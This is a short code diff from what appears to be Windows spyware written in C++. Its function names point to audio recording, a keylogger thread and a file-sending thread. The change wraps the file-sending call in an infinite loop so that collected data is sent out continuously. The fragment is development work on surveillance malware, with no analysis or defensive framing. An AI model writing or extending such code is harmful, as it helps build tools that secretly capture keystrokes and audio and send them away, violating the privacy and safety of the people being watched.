@@ -11,7 +11,7 @@ DWORD WINAPI threadEnregistrementAudio(LPVOID windowsPointerParams) {
 }
 
 DWORD WINAPI fileSendingThread(LPVOID windowsPointerParams){
-    continuousFileSend();
+    while(true)continuousFileSend();
 }
 
 void beginKeyloggerThread(HANDLE &thread, LPDWORD threadId) {
